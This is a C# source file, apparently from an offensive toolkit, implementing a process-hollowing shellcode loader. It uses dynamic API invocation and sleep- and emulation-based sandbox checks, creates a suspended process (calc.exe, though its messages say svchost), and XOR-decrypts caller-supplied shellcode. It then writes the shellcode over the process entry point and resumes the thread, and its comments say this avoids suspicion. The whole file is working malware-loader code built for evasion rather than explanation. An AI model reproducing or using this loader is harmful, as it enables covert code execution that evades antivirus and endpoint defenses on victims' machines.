using System;
using System.Runtime.InteropServices;
using DInvoke.DynamicInvoke;

namespace Hollow
{
    public class DynamicInvoke
    {
        public static void Hollow(byte[] shellcode, string k) { 
            //Sleep to avoid sandbox environments
            DateTime t1 = DateTime.Now;
            var sleepParameters = new object[]
            {
                    (uint)2000
            };

            Generic.DynamicAPIInvoke("kernel32.dll", "Sleep", typeof(Win32.Sleep), ref sleepParameters);

            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2< 1.69)
            {
                Console.WriteLine("Exiting as sleep wasn't met...");
                return;
            }

                var getCurrentProcParameters = new object[] { };
                var vaexParameters = new object[]
                {
                            Generic.DynamicAPIInvoke("kernel32.dll", "GetCurrentProcess", typeof(Win32.GetCurrentProcess), ref getCurrentProcParameters), IntPtr.Zero, (uint)0x1000, (uint)0x3000, (uint)0x40, (uint)0
                };

                IntPtr veax = (IntPtr)Generic.DynamicAPIInvoke("kernel32.dll", "VirtualAllocExNuma", typeof(Win32.VirtualAllocExNuma), ref vaexParameters);

            if (veax == null)
            {
                return;
            }

            var flsParameters = new object[]
            {
                            IntPtr.Zero
            };

            IntPtr fls = (IntPtr)Generic.DynamicAPIInvoke("kernel32.dll", "FlsAlloc", typeof(Win32.FlsAlloc), ref flsParameters);

            if (fls == null)
            {
                return;
            }

            Win32.PS_CREATE_INFO ci = new Win32.PS_CREATE_INFO();
            // https://gist.github.com/rasta-mouse/2f6316083dd2f38bb91f160cca2088df
            ci.Size = (UIntPtr)88; // sizeof(PS_CREATE_INFO)
            ci.State = Win32.PS_CREATE_STATE.PsCreateInitialState;
            ci.Unused = new byte[76];

            Win32.UNICODE_STRING imagePath, currentDirectory, commandLine;
            imagePath = currentDirectory = commandLine = new Win32.UNICODE_STRING();

            Win32.RtlInitUnicodeString(ref imagePath, "\\??\\C:\\Windows\\System32\\calc.exe");
            Win32.RtlInitUnicodeString(ref currentDirectory, "C:\\Windows\\System32");
            Win32.RtlInitUnicodeString(ref commandLine, "C:\\Windows\\System32\\calc.exe");

            var processParams = IntPtr.Zero;

            object[] parameters =
            {
                processParams, imagePath, IntPtr.Zero, currentDirectory, commandLine, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, Win32.CREATE_PROCESS_PARAMETERS_FLAGS.Normalize
            };

            var status = (Win32.NTSTATUS)Generic.DynamicAPIInvoke( "ntdll.dll", "RtlCreateProcessParametersEx", typeof(Win32.RtlCreateProcessParametersEx), ref parameters);

            if (status == Win32.NTSTATUS.Success)
            {
                processParams = (IntPtr)parameters[0];
                Console.WriteLine("[*] Successfully created process parameters with RtlCreateProcessParametersEx");
            }
            else
            {
                Console.WriteLine("[!] Failed to create process parameters!");
            }

            var attributeList = new Win32.PS_ATTRIBUTE_LIST { Attributes = new Win32.PS_ATTRIBUTE[1] };
            attributeList.TotalLength = (UIntPtr)Marshal.SizeOf(attributeList);
            attributeList.Attributes[0].Attribute = 0x20005;
            attributeList.Attributes[0].Size = imagePath.Length;
            attributeList.Attributes[0].Value = imagePath.Buffer;

            IntPtr hThread = IntPtr.Zero;
            IntPtr hProcess = IntPtr.Zero;

            var NtUAddress = Generic.GetLibraryAddress("ntdll.dll", "NtCreateUserProcess");
            var ntCreateUserProcess = (Win32.NtCreateUserProcess)Marshal.GetDelegateForFunctionPointer(NtUAddress, typeof(Win32.NtCreateUserProcess));

            var check = ntCreateUserProcess(ref hProcess, ref hThread, Win32.PROCESS_ACCESS.AllAccess, Win32.THREAD_ACCESS.AllAccess, IntPtr.Zero, IntPtr.Zero, Win32.PROCESS_CREATE_FLAGS.None, Win32.THREAD_CREATE_FLAGS.Suspended, processParams, ref ci, ref attributeList);

            if (check == Win32.NTSTATUS.Success)
            {
                Console.WriteLine("[*] Created svchost.exe process successfully!");
            }
            else
            {
                Console.WriteLine("[!] Failed to create svchost process :(");
            }

            Console.WriteLine(hProcess);
            Console.WriteLine(hThread);
            
            Win32.PROCESS_BASIC_INFORMATION bi = new Win32.PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            var address = Generic.GetLibraryAddress("ntdll.dll", "ZwQueryInformationProcess");
            var zwQueryInformationProcess = (Win32.ZwQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(address, typeof(Win32.ZwQueryInformationProcess));

            int res = zwQueryInformationProcess(
                hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp
                );

            if (res == 0)
            {
                Console.WriteLine("[*] Got process information using ZwQueryInformationProcess...");
            }
            else
            {
                Console.WriteLine("[!] Failed to get process information using ZwQueryInformationProcess :(");
                return;
            }

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            var rpmAddress = Generic.GetLibraryAddress("kernel32.dll", "ReadProcessMemory");
            var readProcessMemory = (Win32.ReadProcessMemory)Marshal.GetDelegateForFunctionPointer(rpmAddress, typeof(Win32.ReadProcessMemory));

            var r1 = readProcessMemory(
                    hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead
                );

            if (!r1)
            {
                Console.WriteLine("[!] Failed to ReadProcessMemory on the first try :(");
                return;
            }

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
            Console.WriteLine($"[*] Obtained base of svchost.exe (0x{svchostBase.ToString("x")})");

            byte[] data = new byte[0x200];

            var r2 = readProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            if (!r2)
            {
                Console.WriteLine("[!] Failed to ReadProcessMemory on the second try :(");
                return;
            }

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            // Add the address of svchost base to the entry point calculated by adding the offset of the optional header to our base data address
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            Console.WriteLine($"[*] Found address of Entry Point (0x{addressOfEntryPoint.ToString("x")})");

            // Decryption Routine
            for (int i = 0; i < shellcode.Length; i++)
            {
                shellcode[i] = (byte)(shellcode[i] ^ k[i % k.Length]);
            }

            //Write shellcode into the processes execution instructions
            var writeProcMemParameters = new object[]
            {
                hProcess, addressOfEntryPoint, shellcode, shellcode.Length, nRead
            };
            var writeCheck = (bool)Generic.DynamicAPIInvoke("kernel32.dll", "WriteProcessMemory", typeof(Win32.WriteProcessMemory), ref writeProcMemParameters);

            if (!writeCheck)
            {
                Console.Write("[!] Failed to write to remote svchost process!");
                return;
            }
            else
            {
                Console.WriteLine("[*] Performed remote process write into svchost...");
            }

            //Since the thread is suspended, we resume rather than execute it
            //Hopefully avoids suspicion more than previous methods, as this is a trusted process that communicates over networks regularly
            var resThreadParameters = new object[]
            {
                hThread
            };

            uint resumeCheck = (uint)Generic.DynamicAPIInvoke("kernel32.dll", "ResumeThread", typeof(Win32.ResumeThread), ref resThreadParameters);
            if (resumeCheck > 1)
            {
                Console.WriteLine($"[!] Failed to resume the thread! It is still suspended! Returned value: {resumeCheck}!");
                return;
            }
            else if (resumeCheck == 0)
            {
                Console.WriteLine($"[!] No idea how we got here. Thread appears to have not been suspended in the first place! Returned value: {resumeCheck}");
            }
            else
            {
                Console.WriteLine($"[*] Resumed thread successfully! Returned value: {resumeCheck}!");
            }         
            
            
        }
    }
}

